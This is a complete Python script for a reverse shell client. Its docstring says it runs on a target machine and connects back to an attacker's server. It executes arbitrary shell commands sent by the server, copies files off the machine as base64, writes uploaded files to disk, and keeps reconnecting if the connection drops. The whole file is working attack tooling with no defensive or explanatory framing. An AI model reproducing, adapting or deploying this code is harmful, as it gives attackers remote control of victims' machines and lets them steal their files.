#!/usr/bin/env python3
"""
Reverse Shell Client
Runs on the target machine and connects to the attacker's server.
Supports command execution, file transfer, and directory navigation.
"""

import socket
import subprocess
import json
import base64
import os
import sys
import time

class ReverseShellClient:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.socket = None
        self.current_directory = os.getcwd()
        
    def connect(self):
        """Establish connection to the server with reconnection logic."""
        while True:
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.connect((self.host, self.port))
                print(f"[+] Connected to {self.host}:{self.port}")
                return True
            except Exception as e:
                print(f"[-] Connection failed: {e}")
                print("[*] Retrying in 5 seconds...")
                time.sleep(5)
    
    def send_data(self, data):
        """Send JSON data to the server."""
        try:
            json_data = json.dumps(data)
            self.socket.send(json_data.encode())
        except Exception as e:
            print(f"[-] Error sending data: {e}")
            raise
    
    def receive_data(self):
        """Receive JSON data from the server."""
        try:
            data = ""
            while True:
                chunk = self.socket.recv(1024)
                if not chunk:
                    return None
                data += chunk.decode()
                try:
                    return json.loads(data)
                except json.JSONDecodeError:
                    continue
        except Exception as e:
            print(f"[-] Error receiving data: {e}")
            return None
    
    def execute_command(self, command):
        """Execute a system command and return the output."""
        try:
            # Handle cd command separately
            if command.startswith("cd "):
                path = command[3:].strip()
                try:
                    if os.path.isabs(path):
                        os.chdir(path)
                    else:
                        os.chdir(os.path.join(self.current_directory, path))
                    self.current_directory = os.getcwd()
                    return f"Changed directory to: {self.current_directory}"
                except Exception as e:
                    return f"Error changing directory: {str(e)}"
            
            # Execute other commands
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
                cwd=self.current_directory
            )
            stdout, stderr = process.communicate()
            output = stdout.decode() + stderr.decode()
            
            if not output:
                output = f"Command executed successfully (exit code: {process.returncode})"
            
            return output
        except Exception as e:
            return f"Error executing command: {str(e)}"
    
    def download_file(self, file_path):
        """Read and encode a file in base64."""
        try:
            if os.path.isabs(file_path):
                full_path = file_path
            else:
                full_path = os.path.join(self.current_directory, file_path)
            
            if not os.path.exists(full_path):
                return None, "File not found"
            
            if not os.path.isfile(full_path):
                return None, "Path is not a file"
            
            with open(full_path, "rb") as f:
                file_content = f.read()
                encoded_content = base64.b64encode(file_content).decode()
                return encoded_content, None
        except Exception as e:
            return None, f"Error reading file: {str(e)}"
    
    def upload_file(self, file_path, file_content):
        """Decode base64 content and save to file."""
        try:
            if os.path.isabs(file_path):
                full_path = file_path
            else:
                full_path = os.path.join(self.current_directory, file_path)
            
            # Create directory if it doesn't exist
            os.makedirs(os.path.dirname(full_path) if os.path.dirname(full_path) else ".", exist_ok=True)
            
            decoded_content = base64.b64decode(file_content)
            with open(full_path, "wb") as f:
                f.write(decoded_content)
            
            return f"File uploaded successfully to: {full_path}"
        except Exception as e:
            return f"Error uploading file: {str(e)}"
    
    def handle_command(self, command_data):
        """Process commands from the server."""
        command_type = command_data.get("type")
        
        if command_type == "command":
            command = command_data.get("command", "")
            if command.lower() == "exit":
                return {"type": "response", "output": "Connection closed by user"}
            output = self.execute_command(command)
            return {"type": "response", "output": output}
        
        elif command_type == "download":
            file_path = command_data.get("file_path", "")
            encoded_content, error = self.download_file(file_path)
            if error:
                return {"type": "response", "output": error}
            return {"type": "file_content", "file_path": file_path, "content": encoded_content}
        
        elif command_type == "upload":
            file_path = command_data.get("file_path", "")
            file_content = command_data.get("content", "")
            result = self.upload_file(file_path, file_content)
            return {"type": "response", "output": result}
        
        else:
            return {"type": "response", "output": "Unknown command type"}
    
    def run(self):
        """Main loop - connect and handle commands."""
        while True:
            try:
                if not self.socket or self.socket.fileno() == -1:
                    self.connect()
                
                # Receive command from server
                command_data = self.receive_data()
                if command_data is None:
                    print("[-] Connection lost, reconnecting...")
                    self.socket.close()
                    continue
                
                # Process command and send response
                response = self.handle_command(command_data)
                self.send_data(response)
                
            except KeyboardInterrupt:
                print("\n[!] Client shutting down...")
                if self.socket:
                    self.socket.close()
                break
            except Exception as e:
                print(f"[-] Error in main loop: {e}")
                if self.socket:
                    self.socket.close()
                time.sleep(2)
                continue

def main():
    """Main entry point."""
    if len(sys.argv) != 3:
        print("Usage: python client.py <server_ip> <server_port>")
        print("Example: python client.py 192.168.1.100 4444")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2])
    
    client = ReverseShellClient(host, port)
    client.run()

if __name__ == "__main__":
    main()

